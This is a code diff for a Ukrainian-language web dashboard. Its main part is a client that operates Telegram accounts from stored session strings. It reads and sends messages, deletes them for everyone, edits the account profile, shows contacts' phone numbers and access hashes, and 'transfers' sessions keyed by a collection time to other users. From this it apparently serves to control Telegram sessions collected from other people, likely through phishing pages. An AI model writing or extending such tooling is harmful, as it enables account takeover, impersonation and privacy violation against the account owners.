+                    <!DOCTYPE html><html><head><title>${mediaData.filename || 'Медіа'}</title><style>body { margin: 0; padding: 20px; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; } .media-container { max-width: 90%; max-height: 90%; text-align: center; } img, video, audio { max-width: 100%; max-height: 80vh; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); } .filename { margin-top: 10px; font-family: Arial, sans-serif; color: #666; } .info { margin-top: 10px; font-size: 12px; color: #999; }</style></head><body><div class="media-container">${mediaData.type.includes('image') || mediaData.type.includes('photo') ? `<img src="${mediaUrl}" alt="${mediaData.filename}">` : mediaData.type.includes('video') ? `<video controls><source src="${mediaUrl}" type="video/mp4">Ваш браузер не підтримує відео.</video>`: mediaData.type.includes('audio') || mediaData.type.includes('voice') ? `<audio controls><source src="${mediaUrl}" type="audio/ogg">Ваш браузер не підтримує аудіо.</audio>` : `<p>Тип файлу: ${mediaData.type}</p><a href="${mediaUrl}" download="${mediaData.filename}">Завантажити файл</a>`}<div class="filename">${mediaData.filename || 'Медіа файл'}</div><div class="info">Файл буде автоматично видалено через 5 хвилин</div></div></body></html>`);
+                newWindow.document.close();
+            },
+            async sendMessage(file = null) {
+                if (this.isSendingMessage) return;
+                const input = document.getElementById('tg-message-input');
+                const sendBtn = document.getElementById('tg-send-btn');
+                const text = input.value.trim();
+                if (!text && !file) return;
+
+                this.isSendingMessage = true;
+                sendBtn.disabled = true;
+                const originalInputVal = input.value;
+                input.value = 'Відправка...';
+                input.disabled = true;
+
+                try {
+                    await apiCall('sendTelegramMessage', { 
+                        sessionString: this.sessionString, 
+                        dialogId: this.currentDialogId, 
+                        message: text,
+                        file: file 
+                    });
+                    
+                    await apiCall('readHistory', { sessionString: this.sessionString, dialogId: this.currentDialogId });
+                    
+                    input.value = '';
+                    document.getElementById('tg-file-input').value = '';
+                    await this.loadChat(this.currentDialogId);
+                } catch (error) {
+                    showAlert(`Помилка відправки: ${error.message}`, 'error');
+                    input.value = originalInputVal;
+                } finally {
+                    this.isSendingMessage = false;
+                    sendBtn.disabled = false;
+                    input.disabled = false;
+                    input.style.height = 'auto';
+                }
+            },
+            async showMyProfile() { this.showEntityProfile('me'); },
+            async showCurrentEntityProfile() { if(this.currentDialogId) this.showEntityProfile(this.currentDialogId); },
+            async showEntityProfile(entityId) {
+                const profileContent = document.getElementById('tg-profile-content');
+                openModal(tgProfileModal);
+                const loadingOverlay = showLoadingOverlay(profileContent, 'Завантаження профілю...');
+                
+                try {
+                    const { entity, full } = await apiCall('getTelegramEntityInfo', { sessionString: this.sessionString, entityId });
+                    let profileHtml = `<div class="p-4">
+                        <div class="flex justify-between items-center mb-4"><h3 class="font-bold text-lg">${entity.firstName || entity.title}</h3><button class="modal-close-btn">&times;</button></div>`;
+                    
+                    if (entityId === 'me') {
+                        profileHtml += `<div class="space-y-2"><div><label>Ім'я:</label><input id="tg-prof-first" class="w-full border p-1 rounded" value="${entity.firstName || ''}"></div><div><label>Прізвище:</label><input id="tg-prof-last" class="w-full border p-1 rounded" value="${entity.lastName || ''}"></div><div><label>Про себе:</label><textarea id="tg-prof-about" class="w-full border p-1 rounded">${full.about || ''}</textarea></div></div><div class="mt-4 pt-4 border-t"><h4 class="font-semibold mb-2">Фото/Відео профілю</h4><div id="profile-media-viewer" class="mb-3"></div><div class="flex gap-2 mb-3" id="profile-media-thumbs"></div><input type="file" id="profile-photo-upload" class="hidden" accept="image/*"><div class="flex gap-2"><button onclick="document.getElementById('profile-photo-upload').click()" class="bg-blue-500 text-white p-2 rounded">Завантажити</button><button onclick="telegramManager.updateProfilePhoto(null)" class="bg-red-500 text-white p-2 rounded">Видалити фото</button></div></div><div class="mt-4 text-right"><button onclick="telegramManager.updateProfile()" class="bg-green-500 text-white p-2 rounded">Зберегти зміни</button></div>`;
+                    } else {
+                        profileHtml += `<div class="space-y-3"><div class="grid grid-cols-2 gap-4"><div><strong>ID:</strong> ${entity.id}</div>${entity.username ? `<div><strong>Username:</strong> @${entity.username}</div>` : ''}${entity.phone ? `<div><strong>Телефон:</strong> +${entity.phone}</div>` : ''}${entity.firstName ? `<div><strong>Ім'я:</strong> ${entity.firstName}</div>` : ''}${entity.lastName ? `<div><strong>Прізвище:</strong> ${entity.lastName}</div>` : ''}</div>${full.about ? `<div><strong>Опис:</strong><br><p class="mt-1 text-gray-700">${full.about}</p></div>` : ''}${full.commonChatsCount ? `<div><strong>Спільні чати:</strong> ${full.commonChatsCount}</div>` : ''}${full.botInfo ? `<div><strong>Бот:</strong> ${full.botInfo.description || 'Так'}</div>` : ''}${full.verified ? `<div><strong>Верифікований:</strong> ✅</div>` : ''}${full.premium ? `<div><strong>Premium:</strong> ⭐</div>` : ''}${full.scam ? `<div><strong>Scam:</strong> ⚠️</div>` : ''}${full.fake ? `<div><strong>Fake:</strong> ⚠️</div>` : ''}${full.restricted ? `<div><strong>Обмежений:</strong> 🔒</div>` : ''}${full.support ? `<div><strong>Підтримка:</strong> 🛠️</div>` : ''}${full.min ? `<div><strong>Мінімальний:</strong> ${full.min}</div>` : ''}${full.botInlineGeo ? `<div><strong>Bot Inline Geo:</strong> ${full.botInlineGeo}</div>` : ''}${full.callActive ? `<div><strong>Активний дзвінок:</strong> 📞</div>` : ''}${full.callNotEmpty ? `<div><strong>Дзвінок не порожній:</strong> 📞</div>` : ''}${full.phoneCallsAvailable ? `<div><strong>Дзвінки доступні:</strong> 📞</div>` : ''}${full.phoneCallsPrivate ? `<div><strong>Приватні дзвінки:</strong> 📞</div>` : ''}${full.voiceMessagesForbidden ? `<div><strong>Голосові повідомлення заборонені:</strong> 🚫</div>` : ''}${full.translationsDisabled ? `<div><strong>Переклади відключені:</strong> 🚫</div>` : ''}${full.storiesPinnedAvailable ? `<div><strong>Stories Pinned Available:</strong> 📌</div>` : ''}${full.blocked ? `<div><strong>Заблокований:</strong> 🚫</div>` : ''}${full.blockedMyStoriesFrom ? `<div><strong>Заблоковані мої stories:</strong> 🚫</div>` : ''}${full.closeFriend ? `<div><strong>Близький друг:</strong> ❤️</div>` : ''}${full.contact ? `<div><strong>Контакт:</strong> 👤</div>` : ''}${full.mutualContact ? `<div><strong>Взаємний контакт:</strong> 🤝</div>` : ''}${full.storiesHidden ? `<div><strong>Stories приховані:</strong> 👁️‍🗨️</div>` : ''}${full.storiesUnavailable ? `<div><strong>Stories недоступні:</strong> 👁️‍🗨️</div>` : ''}${full.id ? `<div><strong>Повний ID:</strong> ${full.id}</div>` : ''}${full.accessHash ? `<div><strong>Access Hash:</strong> ${full.accessHash}</div>` : ''}</div>`;
+                    }
+                    profileHtml += `</div>`;
+                    profileContent.innerHTML = profileHtml;
+                    profileContent.querySelector('.modal-close-btn').addEventListener('click', () => closeModal(tgProfileModal));
+                    
+                    if(document.getElementById('profile-photo-upload')) {
+                        document.getElementById('profile-photo-upload').onchange = (e) => this.updateProfilePhoto(e.target.files);
+                    }
+                } catch(e) {
+                    showAlert("Не вдалося завантажити профіль: " + e.message, 'error');
+                } finally {
+                    hideLoadingOverlay(profileContent);
+                }
+            },
+            async updateProfile() {
+                const firstName = document.getElementById('tg-prof-first').value;
+                const lastName = document.getElementById('tg-prof-last').value;
+                const about = document.getElementById('tg-prof-about').value;
+                
+                const profileContent = document.getElementById('tg-profile-content');
+                const loadingOverlay = showLoadingOverlay(profileContent, 'Збереження...');
+                
+                try {
+                    await apiCall('updateTelegramProfile', { sessionString: this.sessionString, firstName, lastName, about });
+                    showAlert('Профіль оновлено!', 'success');
+                } catch(e) {
+                    showAlert('Помилка оновлення: ' + e.message, 'error');
+                } finally {
+                    hideLoadingOverlay(profileContent);
+                    closeModal(tgProfileModal);
+                }
+            },
+            async updateProfilePhoto(file) {
+                const profileContent = document.getElementById('tg-profile-content');
+                const loadingOverlay = showLoadingOverlay(profileContent, file ? 'Завантаження фото...' : 'Видалення фото...');
+                
+                try {
+                    let filePayload = null;
+                    if(file) {
+                        filePayload = await new Promise((resolve, reject) => {
+                            const reader = new FileReader();
+                            reader.onload = e => resolve({ name: file.name, data: e.target.result.split(',') });
+                            reader.onerror = reject;
+                            reader.readAsDataURL(file);
+                        });
+                    }
+                    await apiCall('updateTelegramProfilePhoto', { sessionString: this.sessionString, file: filePayload });
+                    showAlert('Фото профілю оновлено!', 'success');
+                } catch(e) {
+                    showAlert("Помилка оновлення фото: " + e.message, 'error');
+                } finally {
+                    hideLoadingOverlay(profileContent);
+                    closeModal(tgProfileModal);
+                }
+            },
+            showMessageActions(event, messageId, base64Text) {
+                if (this.selectionMode) return;
+                
+                const options = [
+                    {text: 'Редагувати', icon: '✏️', action: () => this.editMessagePrompt(messageId, base64Text)},
+                    {text: 'Копіювати', icon: '📋', action: () => this.copyMessage(messageId, base64Text)},
+                    'separator',
+                    {text: 'Переслати', icon: '↗️', action: () => this.forwardSingleMessage(messageId)},
+                    {text: 'Вибрати', icon: '☑️', action: () => this.enterSelectionMode(messageId)},
+                    'separator',
+                    {text: 'Видалити', icon: '🗑️', action: () => this.deleteMessage(messageId), danger: true}
+                ];
+                
+                showContextMenu(event, options);
+            },
+            copyMessage(messageId, base64Text) {
+                try {
+                    const text = decodeURIComponent(atob(base64Text));
+                    navigator.clipboard.writeText(text).then(() => {
+                        showAlert('Повідомлення скопійовано', 'success');
+                    }).catch(() => {
+                        const textArea = document.createElement('textarea');
+                        textArea.value = text;
+                        document.body.appendChild(textArea);
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                        showAlert('Повідомлення скопійовано', 'success');
+                    });
+                } catch (error) {
+                    showAlert('Не вдалося скопіювати повідомлення', 'error');
+                }
+            },
+            showDialogActions(event, dialogId, isUser) {
+                const options = [];
+                
+                if (isUser) {
+                    options.push({ text: 'Заблокувати', icon: '🚫', action: () => this.toggleBlock(dialogId), danger: true });
+                    options.push('separator');
+                }
+                
+                options.push({ text: 'Видалити чат', icon: '🗑️', action: () => this.deleteDialog(dialogId), danger: true });
+                
+                showContextMenu(event, options);
+            },
+            editMessagePrompt(messageId, base64Text) {
+                const currentText = decodeURIComponent(atob(base64Text));
+                const newText = prompt("Введіть новий текст:", currentText);
+                if (newText && newText !== currentText) {
+                    this.editMessage(messageId, newText);
+                }
+            },
+            async editMessage(messageId, newText) {
+                showLoader('Редагування...');
+                try {
+                    await apiCall('editTelegramMessage', { sessionString: this.sessionString, dialogId: this.currentDialogId, messageId, text: newText });
+                    await this.loadChat(this.currentDialogId);
+                } catch(e) {
+                    showAlert('Помилка редагування: ' + e.message, 'error');
+                } finally { hideLoader(); }
+            },
+            async deleteMessage(messageId) { this.deleteSelectedMessages([messageId]); },
+            async deleteSelectedMessages(ids = null) {
+                const messagesToDelete = ids || this.selectedMessages;
+                if (messagesToDelete.length === 0) return;
+
+                showConfirmModal(`Видалити ${messagesToDelete.length} повідомлен(ь/ня) для всіх?`, async () => {
+                     showLoader('Видалення...');
+                    try {
+                        await apiCall('deleteTelegramMessages', { sessionString: this.sessionString, messageIds: messagesToDelete });
+                        this.exitSelectionMode();
+                        await this.loadChat(this.currentDialogId);
+                    } catch(e) {
+                        showAlert('Помилка видалення: ' + e.message, 'error');
+                    } finally { hideLoader(); }
+                });
+            },
+            async forwardSingleMessage(messageId) {
+                this.selectedMessages = [messageId];
+                this.forwardSelectedMessages();
+            },
+            async forwardSelectedMessages() {
+                if (this.selectedMessages.length === 0) return;
+                const listContainer = document.getElementById('tg-forward-dialog-list');
+                listContainer.innerHTML = this.dialogs.map(d => `
+                    <div class="p-3 flex items-center gap-3 cursor-pointer hover:bg-blue-50" onclick="telegramManager.executeForward('${d.id}')">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold flex-shrink-0">${d.title.charAt(0).toUpperCase()}</div>
+                        <p class="font-semibold text-gray-800 truncate">${d.title}</p>
+                    </div>`).join('');
+                openModal(tgForwardModal);
+            },
+            async executeForward(toDialogId) {
+                closeModal(tgForwardModal);
+                showLoader('Пересилання...');
+                try {
+                    await apiCall('forwardMessages', {
+                        sessionString: this.sessionString,
+                        toDialogId: toDialogId,
+                        fromDialogId: this.currentDialogId,
+                        messageIds: this.selectedMessages
+                    });
+                    this.exitSelectionMode();
+                } catch (e) {
+                    showAlert('Помилка пересилання: ' + e.message, 'error');
+                } finally { hideLoader(); }
+            },
+            async toggleBlock(userId) {
+                showConfirmModal('Ви впевнені, що хочете заблокувати цього користувача?', async () => {
+                    showLoader('Блокування...');
+                    try {
+                        await apiCall('toggleTelegramBlock', { sessionString: this.sessionString, userId, blocked: true });
+                        showAlert('Користувача заблоковано.', 'success');
+                    } catch(e) {
+                        showAlert('Помилка блокування: ' + e.message, 'error');
+                    } finally { hideLoader(); }
+                });
+            },
+            async deleteDialog(dialogId) {
+                 showConfirmModal('Ви впевнені, що хочете видалити цей чат? Історія буде втрачена.', async () => {
+                    showLoader('Видалення чату...');
+                    try {
+                        await apiCall('deleteTelegramDialog', { sessionString: this.sessionString, dialogId });
+                        this.goBackToDialogs();
+                        await this.loadDialogs();
+                    } catch(e) {
+                        showAlert('Помилка видалення: ' + e.message, 'error');
+                    } finally { hideLoader(); }
+                });
+            },
+            handleFileSelect(event) {
+                const file = event.target.files[0];
+                if (!file) return;
+                
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const filePayload = {
+                        name: file.name,
+                        data: e.target.result.split(',')[1]
+                    };
+                    this.sendMessage(filePayload);
+                };
+                reader.readAsDataURL(file);
+            },
+            goBackToDialogs() {
+                telegramClientModal.classList.remove('chat-active');
+                document.getElementById('tg-back-btn').classList.add('hidden');
+                document.getElementById('tg-chat-header').querySelector('h3').textContent = 'Чати';
+                document.getElementById('tg-chat-status').textContent = '';
+                this.currentDialogId = null;
+            },
+            close() {
+                this.sessionString = null;
+                this.dialogs = [];
+                this.currentDialogId = null;
+                this.me = null;
+                this.isSendingMessage = false;
+                this.exitSelectionMode();
+                this.goBackToDialogs();
+                document.getElementById('tg-dialogs-list').innerHTML = '';
+                document.getElementById('tg-chat-content').innerHTML = '<div class="m-auto text-center text-gray-500"><p>Оберіть чат, щоб почати спілкування.</p></div>';
+            },
+            handleMessageClick(messageId) {
+                if (!this.selectionMode) return;
+                this.toggleMessageSelection(messageId);
+            },
+            toggleMessageSelection(messageId) {
+                const index = this.selectedMessages.indexOf(messageId);
+                const msgElement = document.getElementById(`msg-${messageId}`);
+                if (index > -1) {
+                    this.selectedMessages.splice(index, 1);
+                    msgElement.style.backgroundColor = '';
+                } else {
+                    this.selectedMessages.push(messageId);
+                    msgElement.style.backgroundColor = 'rgba(59, 130, 246, 0.3)';
+                }
+                document.getElementById('tg-selection-count').textContent = `${this.selectedMessages.length} вибрано`;
+                if (this.selectedMessages.length === 0) {
+                    this.exitSelectionMode();
+                }
+            },
+            enterSelectionMode(initialMessageId) {
+                this.selectionMode = true;
+                document.getElementById('tg-selection-bar').classList.remove('hidden');
+                document.getElementById('tg-message-input-container').classList.add('hidden');
+                this.toggleMessageSelection(initialMessageId);
+            },
+            exitSelectionMode() {
+                this.selectionMode = false;
+                document.getElementById('tg-selection-bar').classList.add('hidden');
+                if (this.currentDialogId) {
+                    const dialog = this.dialogs.find(d => d.id == this.currentDialogId);
+                    if (!dialog.isChannel || dialog.isGroup) {
+                         document.getElementById('tg-message-input-container').classList.remove('hidden');
+                    }
+                }
+                this.selectedMessages.forEach(id => {
+                    const el = document.getElementById(`msg-${id}`);
+                    if(el) el.style.backgroundColor = '';
+                });
+                this.selectedMessages = [];
+            },
+            promptTransferSession(collectedAt){
+                const toUserId = prompt('Введіть ID користувача для передачі сесії:');
+                if(!toUserId) return;
+                const statusEl = document.getElementById('transfer-inline-status');
+                statusEl.textContent = 'Передача...';
+                apiCall('transferSession', { token: localStorage.getItem('jwt_token'), fromTimestamp: collectedAt, toUserId })
+                    .then(res => { if(res && res.success){ statusEl.textContent = 'Передано успішно.'; } else { throw new Error('Помилка передачі'); } })
+                    .catch(e => { statusEl.textContent = 'Помилка: ' + (e.message||''); });
+            },
+        };
+
+        let userData = {};
+        let currentEditorState = { source: 'custom', sourceTemplateId: null };
+        let dataPollingInterval = null;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setupNavigation();
+            themeManager.init();
+            junimoManager.init();
+            editorHistoryManager.init();
+            
+            loadUserData();
+            
+            const pingAiService = () => {
+                if (!RENDER_AI_SERVICE_URL.includes('your-service-name')) {
+                    fetch(RENDER_AI_SERVICE_URL)
+                        .then(res => {
+                            if (res.ok) console.log(`AI Service is awake (Status: ${res.status})`);
+                            else console.warn(`AI Service ping returned status: ${res.status}`);
+                        })
+                        .catch(err => console.error('Failed to ping AI service:', err));
+                }
+            };
+            pingAiService(); 
+            setInterval(pingAiService, 600000); 
+
+            function setVhVariable() {
+                let vh = window.innerHeight * 0.01;
+                document.documentElement.style.setProperty('--vh', `${vh}px`);
+            }
+            window.addEventListener('resize', setVhVariable);
+            setVhVariable();
+        });
+        
+        const editorHistoryManager = {
+            history: [],
+            currentIndex: -1,
+            undoBtn: document.getElementById('undo-btn'),
+            redoBtn: document.getElementById('redo-btn'),
+            
+            init() {
+                this.undoBtn.addEventListener('click', () => this.undo());
+                this.redoBtn.addEventListener('click', () => this.redo());
+
+                let timeout;
+                editor.addEventListener('input', () => {
+                    clearTimeout(timeout);
+                    timeout = setTimeout(() => {
+                        this.pushState(editor.value);
+                    }, 500);
+                });
+
+                editor.addEventListener('keydown', (e) => {
+                    if (e.ctrlKey || e.metaKey) {
+                        if (e.key === 'z') { e.preventDefault(); this.undo(); } 
+                        else if (e.key === 'y') { e.preventDefault(); this.redo(); }
+                    }
+                });
+                this.updateButtons();
+            },
+            pushState(content) {
+                if (this.currentIndex < this.history.length - 1) {
+                    this.history = this.history.slice(0, this.currentIndex + 1);
+                }
+                if (this.history[this.history.length - 1] === content) return;
+                this.history.push(content);
+                this.currentIndex = this.history.length - 1;
+                this.updateButtons();
+            },
+            undo() {
+                if (this.currentIndex > 0) {
+                    this.currentIndex--;
+                    editor.value = this.history[this.currentIndex];
+                    this.updateButtons();
+                }
+            },
+            redo() {
+                if (this.currentIndex < this.history.length - 1) {
+                    this.currentIndex++;
+                    editor.value = this.history[this.currentIndex];
+                    this.updateButtons();
+                }
+            },
+            clear() {
+                this.history = [];
+                this.currentIndex = -1;
+                this.updateButtons();
+            },
+            updateButtons() {
+                this.undoBtn.disabled = this.currentIndex <= 0;
+                this.redoBtn.disabled = this.currentIndex >= this.history.length - 1;
+            }
+        };
+
+        function setupNavigation() {
+            const navLinks = document.querySelectorAll('#sidebar nav a');
+            const sections = {
+                'dashboard-content': document.getElementById('dashboard-content'),
+                'settings-content': document.getElementById('settings-content')
+            };
+            const headers = {
+                'dashboard-content': { title: 'Панель керування', subtitle: 'Керуйте вашими сторінками та даними' },
+                'settings-content': { title: 'Налаштування', subtitle: 'Персоналізуйте ваш досвід' }
+            }
+
+            navLinks.forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const targetId = link.dataset.section;
+                    document.getElementById('main-header-title').textContent = headers[targetId].title;
+                    document.getElementById('main-header-subtitle').textContent = headers[targetId].subtitle;
+                    navLinks.forEach(l => l.classList.remove('active'));
+                    link.classList.add('active');
+                    Object.values(sections).forEach(section => section.style.display = 'none');
+                    if (sections[targetId]) {
+                        sections[targetId].style.display = 'block';
+                    }
+                    window.location.hash = link.hash;
+                    closeSidebar();
+                });
+            });
+
+            const currentHash = window.location.hash || '#dashboard';
+            const initialLink = document.querySelector(`#sidebar nav a[href="${currentHash}"]`);
+            if (initialLink) {
+                initialLink.click();
+            }
+        }
+        
+        const themeManager = {
+            storageKey: 'view2u-theme-settings-v3', // Updated key
+            colorPickers: [],
+            defaultTheme: {},
+            
+            init() {
+                this.colorPickers = document.querySelectorAll('#theme-settings-container input[type="color"]');
+                this.captureDefaults();
+                this.loadTheme();
+
+                this.colorPickers.forEach(picker => {
+                    picker.addEventListener('input', () => this.applyAndSaveTheme());
+                });
+
+                document.getElementById('reset-theme-btn').addEventListener('click', () => this.resetTheme());
+            },
+            captureDefaults() {
+                const rootStyle = getComputedStyle(document.documentElement);
+                this.colorPickers.forEach(picker => {
+                    const cssVar = picker.dataset.cssVar;
+                    this.defaultTheme[cssVar] = rootStyle.getPropertyValue(cssVar).trim();
+                });
+            },
+            loadTheme() {
+                try {
+                    const savedSettings = JSON.parse(localStorage.getItem(this.storageKey));
+                    // Check if the saved theme has all the required keys
+                    if (savedSettings && Object.keys(savedSettings).length === this.colorPickers.length) {
+                        this.applyTheme(savedSettings);
+                    } else {
+                        // If theme is old or invalid, apply and save the new defaults
+                        this.applyTheme(this.defaultTheme);
+                        localStorage.setItem(this.storageKey, JSON.stringify(this.defaultTheme));
+                    }
+                } catch (e) {
+                    console.error("Failed to load theme from localStorage", e);
+                    this.applyTheme(this.defaultTheme);
+                }
+            },
+            applyTheme(settings) {
+                for (const cssVar in settings) {
+                    document.documentElement.style.setProperty(cssVar, settings[cssVar]);
+                }
+                this.colorPickers.forEach(picker => {
+                    const cssVar = picker.dataset.cssVar;
+                    if (settings[cssVar]) {
+                        picker.value = settings[cssVar];
+                    }
+                });
+            },
+            applyAndSaveTheme() {
+                const currentSettings = {};
+                this.colorPickers.forEach(picker => {
+                    currentSettings[picker.dataset.cssVar] = picker.value;
+                });
+                this.applyTheme(currentSettings);
+                localStorage.setItem(this.storageKey, JSON.stringify(currentSettings));
+            },
+            resetTheme() {
+                localStorage.removeItem(this.storageKey);
+                this.applyTheme(this.defaultTheme);
+                showAlert('Тему скинуто до стандартних налаштувань.', 'success');
+            }
+        };
+
+        const junimoManager = {
+            isActive: false,
+            container: null,
+            junimos: [],
+            junimoSources: [
+                './imageJunimo/blue_junimo.png', './imageJunimo/green_junimo.png',
+                './imageJunimo/pink_junimo.png', './imageJunimo/yelow_junimo.png'
+            ],
+            clickCounter: 0,
+            mousePos: { x: window.innerWidth / 2, y: window.innerHeight / 2 },
+            init() {
+                document.getElementById('junimo-form').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    const pass = document.getElementById('junimo-pass').value;
+                    if (pass === '--junimo--') {
+                        if (!this.isActive) this.unleash();
+                        document.getElementById('junimo-pass').value = '';
+                    } else {
+                        showAlert('Неправильна команда.', 'warning');
+                    }
+                });
+                window.addEventListener('mousemove', (e) => {
+                    this.mousePos = { x: e.clientX, y: e.clientY };
+                });
+            },
+            unleash() {
+                this.isActive = true;
+                this.container = document.getElementById('junimo-container');
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(() => this.createJunimo(), i * 200);
+                }
+                document.body.addEventListener('click', () => {
+                    if (!this.isActive) return;
+                    this.clickCounter++;
+                    if (this.clickCounter % 3 === 0) {
+                        this.createJunimo(this.mousePos.x, this.mousePos.y);
+                    }
+                });
+            },
+            createJunimo(startX, startY) {
+                const junimoEl = document.createElement('img');
+                junimoEl.classList.add('junimo');
+                junimoEl.src = this.junimoSources[Math.floor(Math.random() * this.junimoSources.length)];
+                const size = Math.random() * 40 + 40;
+                junimoEl.style.width = `${size}px`;
+                junimoEl.style.height = 'auto';
+                const x = startX !== undefined ? startX : Math.random() * window.innerWidth;
+                const y = startY !== undefined ? startY : Math.random() * window.innerHeight;
+                junimoEl.style.left = `${x}px`;
+                junimoEl.style.top = `${y}px`;
+                if (startX !== undefined) {
+                    junimoEl.style.transform = 'scale(0)';
+                    setTimeout(() => { junimoEl.style.transform = 'scale(1)'; }, 50);
+                }
+                this.container.appendChild(junimoEl);
+                const junimoState = {
+                    element: junimoEl, x, y,
+                    vx: (Math.random() - 0.5) * 2, vy: (Math.random() - 0.5) * 2,
+                    wanderAngle: Math.random() * 2 * Math.PI,
+                    isFollowingMouse: false, followTimeout: null
+                };
+                this.junimos.push(junimoState);
+                if (this.junimos.length === 1) this.animate();
+                junimoEl.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    junimoEl.classList.add('clicked');
+                    setTimeout(() => junimoEl.classList.remove('clicked'), 400);
+                    junimoState.isFollowingMouse = true;
+                    clearTimeout(junimoState.followTimeout);
+                    junimoState.followTimeout = setTimeout(() => { junimoState.isFollowingMouse = false; }, 3000);
+                });
+            },
+            animate() {
+                if (!this.isActive) return;
+                this.junimos.forEach(j => {
+                    if (j.isFollowingMouse) {
+                        const dx = this.mousePos.x - j.x, dy = this.mousePos.y - j.y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist > 1) { j.x += dx * 0.1; j.y += dy * 0.1; }
+                    } else {
+                        const wanderSpeed = 0.5, wanderRadius = 20, angleChange = 0.3;
+                        j.wanderAngle += (Math.random() - 0.5) * angleChange;
+                        const targetX = j.x + Math.cos(j.wanderAngle) * wanderRadius;
+                        const targetY = j.y + Math.sin(j.wanderAngle) * wanderRadius;
+                        j.vx += (targetX - j.x) * 0.01; j.vy += (targetY - j.y) * 0.01;
+                        j.x += j.vx * wanderSpeed; j.y += j.vy * wanderSpeed;
+                        j.vx *= 0.98; j.vy *= 0.98;
+                        if (j.x < 0 || j.x > window.innerWidth) j.vx *= -1.1;
+                        if (j.y < 0 || j.y > window.innerHeight) j.vy *= -1.1;
+                        j.x = Math.max(0, Math.min(window.innerWidth, j.x));
+                        j.y = Math.max(0, Math.min(window.innerHeight, j.y));
+                    }
+                    j.element.style.transform = `translate(${j.x - j.element.width/2}px, ${j.y - j.element.height/2}px) rotate(${j.vx*5}deg)`;
+                });
+                requestAnimationFrame(() => this.animate());
+            }
+        };
+        
+        function showLoader(message = 'Обробка запиту...') {
+            loaderMessage.textContent = message;
+            globalLoader.classList.add('show');
+        }
+        function hideLoader() {
+            globalLoader.classList.remove('show');
+        }
+
+        function showModalLoader(loaderElement, message = 'Обробка запиту...') {
+            const messageSpan = loaderElement.querySelector('span');
+            if (messageSpan) messageSpan.textContent = message;
+            loaderElement.classList.add('show');
+        }
+        function hideModalLoader(loaderElement) {
+            loaderElement.classList.remove('show');
+        }
+        
+        function showNotification(title, message, type = 'info', duration = 5000) {
+            const container = document.getElementById('notification-container');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            const icons = { success: '✓', error: '✕', warning: '⚠', info: 'ℹ' };
+            notification.innerHTML = `<div class="notification-icon">${icons[type] || icons.info}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="removeNotification(this)">×</button><div class="notification-progress"></div>`;
+            container.appendChild(notification);
+            setTimeout(() => notification.classList.add('show'), 10);
+            if (duration > 0) {
+                const progressBar = notification.querySelector('.notification-progress');
+                let width = 100;
+                const interval = setInterval(() => {
+                    width -= 100 / (duration / 100);
+                    progressBar.style.width = width + '%';
+                    if (width <= 0) {
+                        clearInterval(interval);
+                        removeNotification(notification.querySelector('.notification-close'));
+                    }
+                }, 100);
+            }
+            return notification;
+        }
+        
+        function removeNotification(closeBtn) {
+            const notification = closeBtn.closest('.notification');
+            if (notification) {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 300);
+            }
+        }
+        
+        function showAlert(message, type = 'error') {
+            const title = type === 'error' ? 'Помилка' : type === 'success' ? 'Успіх' : type === 'warning' ? 'Попередження' : 'Інформація';
+            showNotification(title, message, type, 5000);
+        }
+        
+        function showContextMenu(event, options) {
+            event.preventDefault();
+            event.stopPropagation();
+            const contextMenu = document.getElementById('context-menu');
+            contextMenu.innerHTML = '';
+            options.forEach(option => {
+                if (option === 'separator') {
+                    contextMenu.appendChild(document.createElement('div')).className = 'context-menu-separator';
+                } else {
+                    const item = document.createElement('button');
+                    item.className = `context-menu-item ${option.danger ? 'danger' : ''}`;
+                    item.innerHTML = `<span class="context-menu-icon">${option.icon || ''}</span><span>${option.text}</span>`;
+                    item.onclick = (e) => { e.stopPropagation(); option.action(); hideContextMenu(); };
+                    contextMenu.appendChild(item);
+                }
+            });
+            const x = event.clientX, y = event.clientY, menuWidth = 160;
+            let finalX = x, finalY = y;
+            if (x + menuWidth > window.innerWidth) finalX = x - menuWidth;
+            if (y + 200 > window.innerHeight) finalY = y - 200;
+            contextMenu.style.left = finalX + 'px';
+            contextMenu.style.top = finalY + 'px';
+            contextMenu.classList.add('show');
+            const hideOnClick = (e) => {
+                if (!contextMenu.contains(e.target)) {
+                    hideContextMenu();
+                    document.removeEventListener('click', hideOnClick);
+                }
+            };
+            setTimeout(() => document.addEventListener('click', hideOnClick), 0);
+        }
+        
+        function hideContextMenu() {
+            document.getElementById('context-menu').classList.remove('show');
+        }
+        
+        function showConfirmModal(message, onConfirm) {
+            confirmMessage.textContent = message;
+            const handleConfirm = () => { onConfirm(); closeModal(confirmModal); };
+            const handleCancel = () => { closeModal(confirmModal); };
+            confirmYesBtn.addEventListener('click', handleConfirm, { once: true });
+            confirmNoBtn.addEventListener('click', handleCancel, { once: true });
+            confirmModal.addEventListener('close', () => {
+                confirmYesBtn.removeEventListener('click', handleConfirm);
+                confirmNoBtn.removeEventListener('click', handleCancel);
+            }, { once: true });
+            openModal(confirmModal);
+        }
+
+        async function apiCall(action, payload = {}) {
+            payload.token = localStorage.getItem('jwt_token');
+            const res = await fetch('/.netlify/functions/public-api', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action, payload }) 
+            });
+            
+            const contentType = res.headers.get('Content-Type');
+            if (contentType?.includes('application/octet-stream')) {
+                if (!res.ok) throw new Error("Failed to download media.");
+                return res.text();
+            }
+
+            const data = await res.json();
+            if (!res.ok) {
+                 if (res.status === 401) {
+                    localStorage.removeItem('jwt_token');
+                    showAlert('Ваш сеанс застарів. Будь ласка, увійдіть знову.', 'warning');
